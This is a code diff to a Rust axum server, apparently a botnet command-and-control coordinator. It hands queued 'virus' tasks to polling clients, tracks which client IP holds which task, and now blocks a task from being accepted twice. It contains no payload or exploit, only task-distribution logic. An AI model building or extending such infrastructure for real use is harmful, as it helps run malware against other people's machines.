@@ -53,7 +53,6 @@ async fn main() {
         .route("/virus_remove", post(virus_remove_handler))
         .route("/virus_status", post(virus_status_handler))
         .route("/pro", get(pro_handler))
-        .route("/list", get(list_handler))
         .with_state(state);
 
     let listener = tokio::net::TcpListener::bind("0.0.0.0:6767").await.unwrap();
@@ -64,9 +63,12 @@ async fn main() {
     axum::serve(listener, master).await.unwrap();
 }
 
-async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<Vec<Virus>> {
-    let que = state.que.lock().await; // отправляем всю очередь вирусов так чтобы его можно было сереализовать обратно в вектор
-    Json(que.clone())
+async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<BotnetStateSnapshot> {
+    // /poll отдаёт весь снапшот: и que, и pro — /list больше не нужен
+    Json(BotnetStateSnapshot {
+        que: state.que.lock().await.clone(),
+        pro: state.pro.lock().await.clone(),
+    })
 }
 
 // снапшот состояния: и очередь и pro
@@ -74,13 +76,6 @@ async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<Vec<Virus>>
 struct BotnetStateSnapshot {
     que: Vec<Virus>,
     pro: HashMap<String, u64>, // ip -> id вируса
-}
-
-async fn list_handler(State(state): State<Arc<BotnetState>>) -> Json<BotnetStateSnapshot> {
-    Json(BotnetStateSnapshot {
-        que: state.que.lock().await.clone(),
-        pro: state.pro.lock().await.clone(),
-    })
 }
 
 async fn pro_handler(State(state): State<Arc<BotnetState>>) -> Json<HashMap<String, u64>> {
@@ -129,9 +124,13 @@ async fn virus_status_handler(
 
             match que.binary_search_by_key(&body.id, |virus| virus.id) {
                 Ok(index) => {
-                    que[index].status = "accepted".to_owned();
-                    pro.insert(ip, body.id); // pro: ip клиента -> id вируса
-                    format!("virus {} accepted", body.id)
+                    if que[index].status == "created" {
+                        que[index].status = "accepted".to_owned();
+                        pro.insert(ip, body.id); // pro: ip клиента -> id вируса
+                        format!("virus {} accepted", body.id)
+                    } else {
+                        format!("virus {} already taken", body.id)
+                    }
                 }
                 Err(_) => format!("virus {} not found in que", body.id),
             }
